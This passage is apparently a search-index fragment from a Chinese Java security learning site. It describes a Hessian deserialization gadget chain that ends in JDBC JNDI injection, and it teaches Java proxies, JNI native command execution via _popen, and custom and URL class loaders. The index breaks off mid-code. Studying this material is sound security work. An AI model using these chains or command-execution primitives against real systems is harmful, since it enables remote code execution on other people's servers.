\u53d1\u73b0\u4f1a\u8c03\u7528this.obj.toString()","title":"\u6b65\u9aa41"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#2","text":"\u7531\u4e8e\u6211\u4eec\u5728poc\u5411EqualsBean\u6784\u9020\u65b9\u6cd5\u4f20\u5165\u4e86ToStringBean\u5bf9\u8c61item\uff0c\u6240\u4ee5this.obj\u5c31\u662f\u4e00\u4e2aToStringBean\u5bf9\u8c61 \u6240\u4ee5this.obj.toString() \u5373ToStringBean.toString \u8ddf\u8fdb\u540e\u53ef\u4ee5\u53d1\u73b0\u5b83\u4f1a\u904d\u5386\u6211\u4eec\u5728ToStringBean\u91cc\u4f20\u5165\u7684\u7c7b\uff08poc\u91cc\u4f20\u5165\u7684\u662fJdbcRowSetImpl\uff09\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u7136\u540e\u65e0\u901a\u8fc7\u53cd\u5c04\u53c2\u8c03\u7528\u6240\u6709\u65b9\u6cd5\u3002 \u5176\u4e2d\u5c31\u4f1a\u8c03\u7528\u5230JdbcRowSetImpl\u7684\u65e0\u53c2\u65b9\u6cd5\uff1agetDatabaseMetaData","title":"\u6b65\u9aa42"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#3","text":"\u6211\u4eec\u8ddf\u8fdbgetDatabaseMetaData \u53d1\u73b0\u4f1a\u8c03\u7528connect\u65b9\u6cd5\uff0c\u7ee7\u7eed\u8ddf\u8fdb\uff0c\u53d1\u73b0jndi\u6ce8\u5165\uff0clookup\u53c2\u6570\u662f\u53ef\u63a7\u7684\uff1a\u6211\u4eec\u5728poc\u4e2d\u6784\u5efaJdbcRowSetImpl\u5bf9\u8c61\u65f6\u901a\u8fc7setDataSourceName\u65b9\u6cd5\u8bbe\u7f6e \u7ee7\u7eed\u8ddf\uff0c\u5f39\u8ba1\u7b97\u5668\u4e86","title":"\u6b65\u9aa43"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/","text":"JAVA\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u56de\u663e URLClassLoader","title":"JAVA\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u56de\u663e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/#java","text":"","title":"JAVA\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u56de\u663e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E7%9A%84%E5%9B%9E%E6%98%BE/#urlclassloader","text":"","title":"URLClassLoader"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/","text":"java\u5b89\u5168\u4e2d\u91cd\u8981\u7684\u51e0\u4e2a\u673a\u5236 \u76ee\u5f55 java \u4ee3\u7406 \u9759\u6001\u4ee3\u7406 \u52a8\u6001\u4ee3\u7406 JNI JNI HelloWorld JNI \u6570\u636e\u7c7b\u578b JNI \u5b9e\u73b0\u672c\u5730\u547d\u4ee4\u6267\u884c \u7c7b\u52a0\u8f7d\u5668 ClassLoader ClassLoader\u81ea\u5b9a\u4e49 URLClassLoader \u53cd\u5c04 \u53cd\u5c04\u7684\u57fa\u7840 \u83b7\u5f97\u4e00\u4e2a\u7c7b\u7684\u7c7b\u5bf9\u8c61 \u83b7\u53d6\u4e00\u4e2a\u7c7b\u5bf9\u8c61\u7684\u6240\u6709\u6210\u5458 \u53cd\u5c04\u7684\u8fdb\u9636\u4e0e\u5b89\u5168 Class.forName \u5b9e\u8d28\u4e0e\u7c7b\u521d\u59cb\u5316 Runtime\u6267\u884c\u547d\u4ee4\u89e3\u6790 ProcessBuilder\u6267\u884c\u547d\u4ee4\u7684\u53cd\u5c04\u5b9e\u73b0 Servlet Servlet\u751f\u547d\u5468\u671f \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684Servlet \u5904\u7406\u4f20\u53c2 cookie\\&session JSP \u6982\u89c8 JSP\u57fa\u7840\u8bed\u6cd5 cookie\\&session RMI \u4f55\u4e3aRMI RMI:\u5b9e\u73b0\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3 \u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3 \u8fdc\u7a0b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b \u4e24\u53f0JVM\u901a\u8baf\u7684\u7b2c\u4e00\u6b65:RMI Registry Stub\u548cSkeleton \u4ee3\u7801\u5b9e\u73b0\u8fdc\u7a0b\u8c03\u7528 javassist java \u4ee3\u7406 \u4ee3\u7406\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u5728\u539f\u6709\u7c7b\u7684\u4ee3\u7801\u4e0d\u53d1\u751f\u6539\u52a8\u7684\u60c5\u51b5\u4e0b\uff0c\u6dfb\u52a0\u65b0\u529f\u80fd\u3002\u8d77\u5230\u4e00\u4e2a\u4fee\u9970\u5668\u7684\u4f5c\u7528\u3002 \u5047\u8bbe\u6211\u4eec\u73b0\u5728\u6709\u4e2a\u7c7b\uff0c\u7528\u4e8e\u6253\u5370helloworld class hello{ public void gogo(){System.out.println(\"Hello Wrold\");} } \u6211\u4eec\u60f3\u5728\u4e0d\u6539\u52a8hello\u7c7b\u7684\u524d\u63d0\u4e0b\uff0c\u5728\u8f93\u51fahelloworld\u65f6\u540c\u65f6\u8f93\u51fa\u5f53\u524d\u65f6\u95f4\u5230\u6587\u4ef6\uff0c\u8fbe\u5230\u65e5\u5fd7\u7684\u529f\u80fd\uff0c\u8be5\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u4ee5\u8fd9\u4e2a\u95ee\u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5f00\u59cb\u5b66\u4e60\u4ee3\u7406\u3002 \u9759\u6001\u4ee3\u7406 \u9759\u6001\u4ee3\u7406\u5f88\u7b80\u5355\uff0c\u4e0d\u7528\u63a5\u89e6\u4ec0\u4e48\u65b0\u6280\u672f\u3002\u5c31\u662f\u521b\u5efa\u4e00\u4e2a\u201d\u7ee7\u627f\u5df2\u6709\u7684\u4e00\u4e2a\u7c7b \u201c\u7684\u7c7b\uff0c\u901a\u8fc7\u91cd\u5199\u7236\u7c7b\u7684\u65b9\u6cd5\uff0c\u8fbe\u5230\u4e0d\u6539\u52a8\u539f\u6709\u7c7b\u7684\u57fa\u7840\u4e0a\u589e\u6dfb\u65b0\u529f\u80fd\u3002\u7eb8\u4e0a\u5f97\u6765\u7ec8\u89c9\u6d45\uff0c\u7528\u4ee3\u7801\u6765\u8bf4\u660e\u4e00\u4e0b\u5427\u3002 \u4ee5\u521a\u521a\u7684\u8f93\u51fahelloworld\u7684\u7c7b\u4e3a\u4f8b\u3002\u6211\u4eec\u7f16\u5199\u4e00\u4e2a\u5b83\u7684\u5b50\u7c7b\uff0c\u5e76\u5728\u5176\u4e2d\u91cd\u5199\u5176gogo\u65b9\u6cd5\uff0c\u6dfb\u52a0\u65e5\u5fd7\u751f\u6210\u529f\u80fd class hello{ public void gogo(){System.out.println(\"Hello Wrold\");} } class static_hello_proxy extends hello{ hello hello_obj; static_hello_proxy(hello hello){ this.hello_obj = hello; } @Override public void gogo(){ log(); hello_obj.gogo(); } public void log(){ Date date = new Date(); String value = \"date:\"+date+\"\\n\"; FileWriter writer = null; try { writer = new FileWriter(new File(\"log.txt\"),true); writer.write(value); writer.flush(); } catch (IOException e) { e.printStackTrace(); } } } \u7136\u540e\u4e3b\u51fd\u6570\u4e2d\u6211\u4eec\u53ea\u9700\u8c03\u7528static_hello_proxy\u4e2d\u7684gogo()\u65b9\u6cd5\u5c31\u80fd\u8fbe\u5230\u65e5\u5fd7\u529f\u80fd\u4e86\u3002\u8fd9\u5c31\u662f\u9759\u6001\u4ee3\u7406\u3002 \u9759\u6001\u4ee3\u7406\u7684\u7f3a\u70b9\u663e\u800c\u6613\u89c1\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4ee3\u7406\u4e0d\u540c\u7684\u7c7b\uff0c\u5c31\u8981\u5199\u51fa\u4e0d\u540c\u7684\u9759\u6001\u4ee3\u7406\u7c7b\u51fa\u6765\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u53ef\u80fd\u4f1a\u9047\u5230\u9700\u8981\u591a\u4e2a\u4ee3\u7406\u7c7b\u6765\u589e\u6dfb\u5b9e\u73b0\u4e00\u4e2a\u7c7b\u7684\u4e0d\u540c\u529f\u80fd\uff0c\u6709\u9700\u8981\u5b9a\u4e49\u4e00\u5927\u5806\u7c7b\u51fa\u6765\u3002\u4e0d\u5bb9\u6613\u7ef4\u62a4\uff0c\u6240\u4ee5\u52a8\u6001\u4ee3\u7406\u5c31\u8bde\u751f\u4e86\uff0c\u5b83\u5f88\u597d\u7684\u89e3\u51b3\u4e86\u9759\u6001\u4ee3\u7406\u4f1a\u4ea7\u751f\u5927\u91cf\u4ee3\u7406\u7c7b\u7684\u96be\u9898\u3002 \u52a8\u6001\u4ee3\u7406 \u4f7f\u7528\u52a8\u6001\u4ee3\u7406\uff0c\u53ef\u4ee5\u4e0d\u7528\u521b\u5efa\u4ee3\u7406\u7c7b\uff0c\u975e\u5e38\u7684\u65b9\u4fbf\u3002 \u52a8\u6001\u4ee3\u7406\u7531Proxy.newProxyInstance\u65b9\u6cd5\u5b9e\u73b0\u3002 \u6211\u4eec\u770b\u770b\u5b83\u7684\u4e09\u4e2a\u53c2\u6570\u3002 loader\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u88ab\u4ee3\u7406\u7c7b\u7684\u7c7b\u52a0\u8f7d\u5668\u3002 interfaces \u88ab\u4ee3\u7406\u7c7b\u6240\u9700\u8981\u5b9e\u73b0\u7684\u63a5\u53e3\uff0c\u53ef\u901a\u8fc7 \u7c7b\u5bf9\u8c61.getinterfaces()\u83b7\u5f97 h \u5373 InvocationHandler\u63a5\u53e3\u7c7b \u7684\u5b9e\u73b0\u7c7b\uff0c\u7528\u4e8e\u5b9e\u73b0\u4ee3\u7406\u589e\u6dfb\u7684\u65b9\u6cd5 \u6211\u4eec\u770b\u770b\u8fd9\u4e2a InvocationHandler \u7c7b\u7684\u7ed3\u6784\u3002\u8fd9\u4e2a\u7c7b\u53ea\u6709\u4e00\u4e2ainvoke\u65b9\u6cd5\uff0c\u4e14\u8fd9\u4e2a\u7c7b\u662f\u63a5\u53e3\u7c7b\u3002\u8fd9\u4e2ainvoke\u65b9\u6cd5\u5c31\u7528\u4e8e\u5b58\u653e\u6211\u4eec\u7684\u589e\u6dfb\u7684\u529f\u80fd\u3002 proxy\u5373\u4ee3\u7406\u5bf9\u8c61\uff0cmethod\u5373\u5bf9\u8c61\u4e2d\u7684\u67d0\u4e2a\u65b9\u6cd5\uff0cargs\u5373\u65b9\u6cd5\u4e2d\u7684\u53c2\u6570\u3002 ok\uff0c\u63a5\u4e0b\u6765\u628a\u521a\u521a\u90a3\u4e2a\u7c7b\u52a8\u6001\u4ee3\u7406\u4e00\u4e0b\u5427\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u52a8\u6001\u4ee3\u7406\u53ea\u80fd\u4ee3\u7406\u63a5\u53e3\u5b9e\u73b0\u7c7b\u3002 import java.io.File; import java.io.FileInputStream; import java.io.FileWriter; import java.io.IOException; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.util.Date; public class test { public static void main(String[] args){ hello hello_obj = new hello(); ClassLoader Loader = hello_obj.getClass().getClassLoader(); Class<?>[] Interfaces = hello_obj.getClass().getInterfaces(); InvocationHandler ih = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if(method.getName()==\"gogo\"){ FileWriter writer = new FileWriter(\"log.txt\"); writer.write(\"date:\"+new Date()+\"|by \u52a8\u6001\u4ee3\u7406\\n\"); writer.flush(); hello_obj.gogo(); } return null; } }; hello_interface proxy = (hello_interface) Proxy.newProxyInstance(Loader,Interfaces,ih); //\u6ce8\u610f\u8fd9\u91cc\u6570\u636e\u7c7b\u578b\u662f\u63a5\u53e3\u7684\u6570\u636e\u7c7b\u578b proxy.gogo(); } } interface hello_interface{ public void gogo(); } class hello implements hello_interface{ public void gogo(){System.out.println(\"Hello Wrold\");} } OK,ALL DOWN JNI JNI\u662fJAVA\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u7528\u6765\u5b9e\u73b0c/c++\u8c03\u7528\uff0c\u4e3aJAVA\u63d0\u4f9b\u4e86\u4e00\u4e2a\u64cd\u7eb5\u5e95\u5c42\u7684\u80fd\u529b\u3002 JNI HelloWorld java IDE\uff1aidea C IDE\uff1avs2019 1.\u5199\u597dJAVA\u6587\u4ef6\uff0c\u5b9a\u4e49\u597dnative\u65b9\u6cd5\u3002 public class test { static{ System.loadLibrary(\"Dll1\"); } public native void hello(); public static void main(String[] args) { test a = new test(); a.hello(); } } 2.\u4f7f\u7528javac\u6307\u4ee4\u4e3ajava\u6587\u4ef6\u7684\u5404native\u65b9\u6cd5\u751f\u6210c\u8bed\u8a00\u5934\u6587\u4ef6\u3002 javac -cp . test.java -h . \u6267\u884c\u540e\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a\u5934\u6587\u4ef6 3.\u7528vscode\u521b\u5efa\u4e00\u4e2adll\u9879\u76ee\uff0c\u5c06test.h\u4e0ejdk include\u76ee\u5f55\u4e0b\u7684jni.h\u4ee5\u53cajdk/include/win32/jni_md.h\u7edf\u7edf\u79fb\u52a8\u5230\u9879\u76ee\u6587\u4ef6\u76ee\u5f55\u4e0b\u3002\u7136\u540e\u5728vscode\u5934\u6587\u4ef6\u91cc\u6dfb\u52a0\u73b0\u6709\u9879\uff0c\u628a\u521a\u521a\u653e\u5230\u9879\u76ee\u6587\u4ef6\u4e0b\u76843\u4e2a\u5934\u6587\u4ef6\u6dfb\u52a0\u8fdb\u53bb\u3002 4.\u5728c\u6216c++\u4e2d\u5b9a\u4e49native\u65b9\u6cd5\u7684c/c++\u539f\u578b\u3002 \u901a\u8fc7test.h\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u54ea\u4e9b\u65b9\u6cd5\u9700\u8981\u6211\u4eec\u5b9a\u4e49\u3002\u8fd9\u91cc\u662fJava_test_hello\u65b9\u6cd5\u3002 \u6211\u4eec\u968f\u4fbf\u5b9a\u4e49\u4e00\u4e0b #include \"test.h\" JNIEXPORT void JNICALL Java_test_hello(JNIEnv* a, jobject b) { printf(\"Hello,World\"); } \u7f16\u8bd1\u4e3adll\u6587\u4ef6\u3002 5.\u5728idea\u91cc\u4e3a\u5f53\u524d\u9879\u76ee\u6307\u5b9a\u4f9d\u8d56dll\u6587\u4ef6\u8def\u5f84 \u5148\u70b9\u51fb\u7bad\u5934\u6307\u5411\u5904\u7684\u7f16\u8f91\u9009\u9879\uff0c\u7136\u540e\u5728\u865a\u62df\u673a\u9009\u9879\u91cc\u586b\u4e0a-Djava.library.path=\u4f60\u7684dll\u8def\u5f84 6.\u628adll\u6587\u4ef6\u62d6\u8fdb\u521a\u521a\u914d\u7f6e\u597d\u7684\u4f9d\u8d56\u8def\u5f84\uff0c\u8fd0\u884c JNI \u6570\u636e\u7c7b\u578b JNI\u7c7b\u578b\u6570\u636e\u5728c\u6587\u4ef6\u91cc\u5f53\u4f5c\u4f20\u5165\u53c2\u6570\u548c\u8fd4\u56de\u7ed3\u679c\uff0c\u53c2\u6570\u4f20\u5165\u540e\u5176\u6570\u636e\u7c7b\u578b\u4f1a\u88ab\u7528\u6307\u5b9a\u65b9\u6cd5\u8f6c\u6362\u4e3aC\u7c7b\u578b\u7136\u540e\u88ab\u5904\u7406\uff0c\u5904\u7406\u5b8c\u6bd5\u540e\u4f7f\u7528\u6307\u5b9a\u65b9\u6cd5\u8f6c\u6362\u4e3aJNI\u7c7b\u578b\u8fd4\u56de\u7ed9JAVA\u3002 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e0bc\u4e2dJNI\u7c7b\u578b\u4e0ec\u7c7b\u578b\u4e92\u8f6c\u7684\u51fd\u6570 jstring\u8f6cchar*\uff1aenv->GetStringUTFChars(str, &jsCopy) char*\u8f6cjstring: env->NewStringUTF(\"Hello...\") \u5b57\u7b26\u4e32\u8d44\u6e90\u91ca\u653e: env->ReleaseStringUTFChars(javaString, p); JNI \u5b9e\u73b0\u672c\u5730\u547d\u4ee4\u6267\u884c \u76f8\u5f53\u4e8e\u4e00\u4e2a\u52a0\u5f3a\u7248\u7684helloworld. \u9996\u5148\u6211\u4eec\u770b\u4e00\u4e0b\uff0c\u5982\u679c\u5728c++\u4e2d\u6211\u4eec\u60f3\u6267\u884c\u672c\u5730\u547d\u4ee4\u6267\u884c\u8be5\u5982\u4f55\u6267\u884c #include<iostream> #include<stdio.h> #include <string> std::string gogo(const char* cmd) { const char* cmd = cmd; FILE* fp = _popen(cmd, \"r\"); if (fp != NULL) { std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fp) != NULL) { result += buf; } return result; } } int main() { std::string result = gogo(\"dir\"); std::cout << result; } \u90a3\u4e48\u6211\u4eec\u5728JNI\u91cc\u5982\u4f55\u5b9e\u73b0\u5462?\u5176\u5b9e\u4e5f\u5dee\u4e0d\u591a. \u6211\u4eec\u73b0\u5728\u5199\u597djava\u4ee3\u7801 public class test { static{ System.loadLibrary(\"Dll2\"); } public native String gogo(String cmd); public static void main(String[] args) { test a = new test(); String str = a.gogo(\"dir\"); System.out.println(str); } } \u5199\u597dc++\u4ee3\u7801 #include \"test.h\" #include<iostream> #include<stdio.h> #include <string> JNIEXPORT jstring JNICALL Java_test_gogo(JNIEnv* env, jobject obj, jstring str) { const char* cmd = env->GetStringUTFChars(str, 0); FILE* fd = _popen(cmd, \"r\"); if (fd != NULL) { std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fd) != NULL) { result += buf; } _pclose(fd); return env->NewStringUTF(result.c_str()); } } \u8fd0\u884c\u7ed3\u679c \u7c7b\u52a0\u8f7d\u5668 ClassLoader \u5728JVM\u7c7b\u52a0\u8f7d\u5668\u4e2d\u6700\u9876\u5c42\u7684\u662f Bootstrap ClassLoader(\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668) \u3001 Extension ClassLoader(\u6269\u5c55\u7c7b\u52a0\u8f7d\u5668) \u3001 App ClassLoader(\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668) \uff0c AppClassLoader \u662f\u9ed8\u8ba4\u7684\u7c7b\u52a0\u8f7d\u5668\uff0c\u5982\u679c\u7c7b\u52a0\u8f7d\u65f6\u6211\u4eec\u4e0d\u6307\u5b9a\u7c7b\u52a0\u8f7d\u5668\u7684\u60c5\u51b5\u4e0b\uff0c\u9ed8\u8ba4\u4f1a\u4f7f\u7528 AppClassLoader \u52a0\u8f7d\u7c7b\uff0c ClassLoader.getSystemClassLoader() \u8fd4\u56de\u7684\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668\u4e5f\u662f AppClassLoader \u3002 ClassLoader\u7684\u4e3b\u8981\u65b9\u6cd5\u6709\u4ee5\u4e0b\u51e0\u4e2a\uff1a loadClass (\u52a0\u8f7d\u6307\u5b9a\u7684Java\u7c7b) findClass (\u67e5\u627e\u6307\u5b9a\u7684Java\u7c7b) findLoadedClass (\u67e5\u627eJVM\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u7684\u7c7b) defineClass (\u4ecebyte[]\u83b7\u5f97\u4e00\u4e2aJava\u7c7b) resolveClass (\u94fe\u63a5\u6307\u5b9a\u7684Java\u7c7b) \u5982\u4f55\u901a\u8fc7ClassLoader\u83b7\u53d6\u4e00\u4e2a\u7c7b\u5bf9\u8c61\uff1f\u5f88\u7b80\u5355 Class a = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); \u5b83\u5bf9\u4e00\u4e2a\u7c7b\u7684\u52a0\u8f7d\u6d41\u7a0b\u5982\u4e0b: ClassLoader\u8c03\u7528loadClass(String name)\u65b9\u6cd5\u52a0\u8f7d\u6307\u5b9a\u7c7b \u8c03\u7528findLoadedClass\u68c0\u67e5\u6307\u5b9a\u7684\u7c7b\u662f\u5426\u5df2\u7ecf\u521d\u59cb\u5316\uff0c\u82e5\u5df2\u521d\u59cb\u5316\u5219\u76f4\u63a5\u8fd4\u56de\u7c7b\u5bf9\u8c61 \u5982\u679c\u521b\u5efaClassLoader\u65f6\u4f20\u5165\u7236\u7c7b\u52a0\u8f7d\u5668\uff0c\u5219\u4f7f\u7528\u7236\u7c7b\u52a0\u8f7d\u5668\u52a0\u8f7d\u6307\u5b9a\u7c7b\uff0c\u5426\u5219\u4f7f\u7528JVM\u7684Bootstrap ClassLoader\uff08\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668\uff09\u52a0\u8f7d \u5982\u679c\u4ee5\u4e0a\u6b65\u9aa4\u6ca1\u6709\u5b8c\u6210\u52a0\u8f7d\uff0c\u5219\u4f7f\u7528findClass\u65b9\u6cd5\u5c1d\u8bd5\u52a0\u8f7d\u6307\u5b9a\u7c7b \u5982\u679c\u5f53\u524dClassLoader\u7c7b\u6ca1\u6709\u91cd\u5199findClass\u65b9\u6cd5\u5219\u76f4\u63a5\u8fd4\u56de\u5f02\u5e38\u3002\u82e5\u91cd\u5199\u4e86\u8be5\u65b9\u6cd5\u4e14\u901a\u8fc7findClass\u627e\u5230\u4e86\u4f20\u5165\u7684\u7c7b\u540d\u7684\u5bf9\u5e94\u7684\u7c7b\u5b57\u8282\u7801\uff0c\u90a3\u4e48\u5c31\u4f1a\u4f7f\u7528defineClass\u53bbJVM\u6ce8\u518c\u8be5\u7c7b \u5982\u679cloadClass\u8c03\u7528\u65f6\u4f20\u5165resolve\u7684\u53c2\u6570\u4e3atrue\uff0c\u5219\u90a3\u4e48\u8fd8\u9700\u8981\u8c03\u7528resolveClass\u65b9\u6cd5\u8fde\u63a5\u7c7b\u3002\u8be5\u53c2\u6570\u9ed8\u8ba4\u4e3afalse \u8fd4\u56de\u88abJVM\u52a0\u8f7d\u540e\u7684\u6307\u5b9a\u7c7b\u7684\u7c7b\u5bf9\u8c61 ClassLoader\u81ea\u5b9a\u4e49 java.lang.ClassLoader \u662f\u6240\u6709\u7c7b\u52a0\u8f7d\u5668\u7684\u7236\u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u91cd\u5199\u5176findClass\u65b9\u6cd5\u6765\u5b9e\u73b0\u81ea\u5b9a\u4e49ClassLoader\u3002 \u6211\u4eec\u8bd5\u7740\u81ea\u5b9a\u4e49\u4e00\u4e2a\uff0c\u5f53\u5bf9loadClass\u4f20\u5165com.anbai.sec.classloader.TestHelloWorld \u65f6\u4f1a\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5728\u52a0\u8f7d\u5668\u91cc\u5df2\u7ecf\u5b9a\u4e49\u597d\u4e86\u7684\u5bf9\u5e94\u7c7b\u7684\u7c7b\u5bf9\u8c61\u3002 class TestClassLoader extends ClassLoader{ String testClassName=\"com.anbai.sec.classloader.TestHelloWorld\"; byte[] testClassBytes = new byte[]{-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12}; //\u8fd9\u90e8\u5206\u662f\u7c7b\u5b57\u8282\u7801\uff0c\u662f\u6211\u4ece\u522b\u4eba\u90a3\u91cc\u5ad6\u7684 @Override protected Class<?> findClass(String name) throws ClassNotFoundException { if(name.equals(\"com.anbai.sec.classloader.TestHelloWorld\")){ return defineClass(testClassName,testClassBytes,0,testClassBytes.length); } else{ return super.findClass(name); } } } \u7136\u540e\u4e3b\u51fd\u6570\u6211\u4eec\u5199 public static void main(String[] args) { try { TestClassLoader Loader = new TestClassLoader(); Class clazz = Loader.loadClass(\"com.anbai.sec.classloader.TestHelloWorld\"); Object Instance = clazz.newInstance(); Method method = Instance.getClass().getMethod(\"hello\"); String str = (String) method.invoke(Instance); System.out.println(str); }catch (Exception e){} } \u7ecf\u6d4b\u8bd5\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c\u3002\u6211\u4eec\u7684\u81ea\u5b9a\u4e49ClassLoader\u5c31\u5199\u597d\u4e86\u3002\u5f53\u7136\u8fd8\u6709\u66f4\u591a\u82b1\u91cc\u80e1\u54e8\u7684\u91cd\u5199\u65b9\u6cd5\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u662f\u77e5\u9053\u600e\u4e48\u91cd\u5199\u5373\u53ef\u3002 URLClassLoader URLClassLoader\u4e5f\u662fClassLoader\u7c7b\u4e0b\u7684\u4e00\u4e2a\u91cd\u5199\u7c7b\u3002\u8fd9\u4e2a\u7c7b\u5f88\u597d\u7528\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u534f\u8bae\u83b7\u53d6\u8fdc\u7a0b\u7684jar\u5305\uff0c\u7136\u540e\u901a\u8fc7\u7c7b\u52a0\u8f7d\u5668\u53bb\u83b7\u5f97\u5176\u4e2d\u7684\u6307\u5b9a\u7c7b\u7684\u7c7b\u5bf9\u8c61\u3002\u8bd5\u8bd5\u5427\u3002 \u6d41\u7a0b\u662f\u5148\u5b9a\u4e49\u4e00\u4e2aURL\u5bf9\u8c61\u6307\u5411\u6211\u4eec\u7684jar\u5305\uff0c\u7136\u540e\u5b9e\u4f8b\u5316\u4e00\u4e2aURLClassLoader\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7loadClass\u52a0\u8f7d\u67d0\u4e2a\u7c7b\u83b7\u5f97\u7c7b\u5bf9\u8c61\u3002 import java.lang.reflect.Field; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; public class test { public static void main(String[] args){ try{ // Class clazz = ClassLoader.getSystemClassLoader().loadClass(\"fuck\"); // Method method = 